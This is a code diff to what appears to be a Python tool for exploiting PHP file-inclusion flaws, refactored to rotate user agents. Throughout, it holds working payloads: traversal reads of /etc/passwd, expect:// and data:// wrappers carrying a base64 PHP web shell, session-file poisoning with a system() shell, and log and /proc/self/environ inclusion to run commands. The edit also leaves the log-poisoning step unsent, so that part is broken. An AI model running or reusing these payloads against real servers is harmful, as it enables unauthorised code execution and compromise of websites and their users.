@@ -8,6 +8,8 @@
 
 
 import requests
+from ArgumentHandler import ArgumentHandler
+from UAList import fetchUA
 import re
 from urllib.request import urlopen
 from urllib.error import HTTPError
@@ -30,20 +32,26 @@ phpHeaders1 = quote("expect://id")
 # This is without url encoding beacause it encodes also the base64 and the server doesn't like that
 phpHeaders2 = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"
 
-# PHPSESSID Cookie
+# PHPSESSID Cooki
 cookiePath = "/var/lib/php/sessions/sess_"
 
 # payload for RCE
 payload = "<?php system($_GET['cmd']); ?>"
 
-
-
+def hit(url):
+	response = requests.get(url, headers=fetchUA())
+	response = response.text
+	return stripHtmlTags(response)
 
 # Checks if the url is valid
 def urlCheck(url):
 	try:
-		openn = urlopen(url)
-		return True	
+		#response = urlopen(url)
+		ret = requests.get(url, headers=fetchUA())
+		if ret.status_code == 200:
+			return True
+		else:
+			return False	
 	except Exception as e:
 		print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
 		print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
@@ -66,9 +74,9 @@ def dirTraversalCheck(url):
 	for i in linux_dirTraversal:
 		for n in path1:
 			compUrl = url + i + n
-			check = urlopen(compUrl)
-			response = check.read().decode('utf-8')
-			clean = stripHtmlTags(response)
+			#check = urlopen(compUrl)
+			#response = check.read().decode('utf-8')
+			clean = hit(compUrl)
 			if 'root:x' in clean.lower():
 				print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
 
@@ -78,9 +86,8 @@ def dirTraversalCheck(url):
 # Checks for Remote Code Execution with php headers
 def headerCheck1(url):
 	compUrl = url + phpHeaders1
-	check = urlopen(compUrl)
-	response = check.read().decode('utf-8')
-	clean = stripHtmlTags(response)
+	#check = urlopen(compUrl)
+	clean = hit(compUrl)
 	if 'uid=' in clean.lower():
 		print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
 		
@@ -89,10 +96,9 @@ def headerCheck1(url):
 		
 def headerCheck2(url):
 	compUrl = url + phpHeaders2
-	check = urlopen(compUrl)
-	response = check.read().decode('utf-8')
-	clean = stripHtmlTags(response)
-	if 'uid=' in response.lower():
+	#check = urlopen(compUrl)
+	clean = hit(compUrl)
+	if 'uid=' in clean.lower():
 		print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
 
 
@@ -102,9 +108,8 @@ def headerCheck2(url):
 def filterCheck(url):
 	for y in filterPaths:
 		compUrl = url + filterBase + y
-		check = urlopen(compUrl)
-		response = check.read().decode('utf-8')
-		clean = stripHtmlTags(response)
+		#check = urlopen(compUrl)
+		clean = hit(compUrl)
 		words = clean.split()
 		for i in words:
 			if i.endswith('='):
@@ -116,7 +121,7 @@ def filterCheck(url):
 # Checks if the PHPSESSID cookie can be exploited
 def cookieCheck(url):
 	s = requests.Session()
-	session = s.get(url)
+	session = s.get(url, headers=fetchUA())
 	cookies = session.cookies.get_dict()
 	for i in cookies:
 		if 'phpsessid' in i.lower():
@@ -124,12 +129,11 @@ def cookieCheck(url):
 			value = session.cookies[i]
 			#send the payload to see if there is RCE
 			newUrl = url + payload
-			s.get(newUrl)
+			s.get(newUrl, headers=fetchUA())
 			# open the file to find if the command worked
 			compUrl = url + cookiePath + value + "&cmd=id"
-			check2 = urlopen(compUrl)
-			response = check2.read().decode('utf-8')
-			clean = stripHtmlTags(response)
+			#check2 = urlopen(compUrl)
+			clean = hit(compUrl)	
 			if 'uid='  in clean.lower():
 				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')
 
@@ -137,32 +141,27 @@ def cookieCheck(url):
 
 def logPoisonCheck(url):
 	headers = {"User-Agent": payload}
-	openn = urlopen(url)
-	sendHeader = requests.get(url, headers=headers)
+	response = requests.get(url, headers=fetchUA())
 	# checks the type of the server
-	if "apache" in openn.getheader('Server').lower():
+	if "apache" in response.headers['Server'].lower():
 		# Apache logs
 		logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
 		for q in linux_dirTraversal:
 			for i in logPath:
 				pathth = url + q + i
 				compUrl = pathth + "&cmd=id"
-				check = urlopen(compUrl)
-				response = check.read().decode('utf-8')
-				clean = stripHtmlTags(response)
+				clean = hit(compUrl)
 				if "uid=" in clean.lower():
 					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)	
 	
-	elif "nginx" in openn.getheader('Server').lower():
+	elif "nginx" in response.headers['Server'].lower():
 		# Nginx logs
 		log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
 		for y in linux_dirTraversal:
 			for i in log:
 				pathh = url + y + i
 				compUrl = pathh + "&cmd=id"
-				check = urlopen(compUrl)
-				response = check.read().decode('utf-8')
-				clean = stripHtmlTags(response)
+				clean = hit(compUrl)
 				if "uid=" in clean.lower():
 					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
 	
@@ -174,9 +173,10 @@ def logPoisonCheck(url):
 	
 def main():
 	try:
+		arghandler = ArgumentHandler()
 		print(colored("This script doesn't check for Remote File Inclusion (RFI)", 'blue'))
 		print(colored("If it doesn't show any result that means it didn't find anything!!!", 'blue'))
-		url = input('Please enter URL: ')
+		url = arghandler.url
 		if urlCheck(url):
 			dirTraversalCheck(url)
 			headerCheck1(url)
